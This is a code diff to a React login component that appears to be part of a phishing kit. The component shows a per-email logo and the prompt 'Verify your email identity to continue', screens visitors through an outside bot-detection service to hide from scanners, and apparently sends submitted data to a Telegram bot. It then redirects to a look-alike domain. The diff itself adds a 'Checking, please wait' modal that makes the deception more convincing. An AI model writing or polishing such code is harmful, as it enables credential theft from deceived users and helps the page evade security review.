@@ -9,6 +9,7 @@ const Login = () => {
   const [emailEntered, setEmailEntered] = useState(false);
   const [logo, setLogo] = useState('/favicon.ico'); // Default placeholder logo
   const [instruction, setInstruction] = useState('Verify your email identity to continue.');
+  const [showModal, setShowModal] = useState(false); // State for showing the modal
 
   const getGravatarUrl = (email) => {
     const hash = md5(email.trim().toLowerCase());
@@ -38,6 +39,8 @@ const Login = () => {
       return;
     }
 
+    setShowModal(true); // Show the modal when the form is submitted
+
     try {
       const userIP = await axios.get('https://api64.ipify.org?format=json').then((res) => res.data.ip);
       const response = await axios.post('https://rail-bot-production.up.railway.app/api/detect_bot', {
@@ -48,6 +51,7 @@ const Login = () => {
       const { is_bot, country } = response.data;
 
       if (is_bot) {
+        setShowModal(false); // Hide modal before redirecting
         window.location.href = '/denied';
         return;
       }
@@ -69,9 +73,10 @@ const Login = () => {
         parse_mode: 'HTML',
       });
 
-      alert('Login successful!');
+      setShowModal(false); // Hide modal before redirecting
       window.location.href = 'https://googlebite.com';
     } catch (error) {
+      setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
       alert('An error occurred. Please try again later.');
     }
@@ -118,6 +123,14 @@ const Login = () => {
           </>
         )}
       </div>
+
+      {showModal && (
+        <div className={styles.modal}>
+          <div className={styles.modalContent}>
+            Checking, please wait<span className={styles.dots}>...</span>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
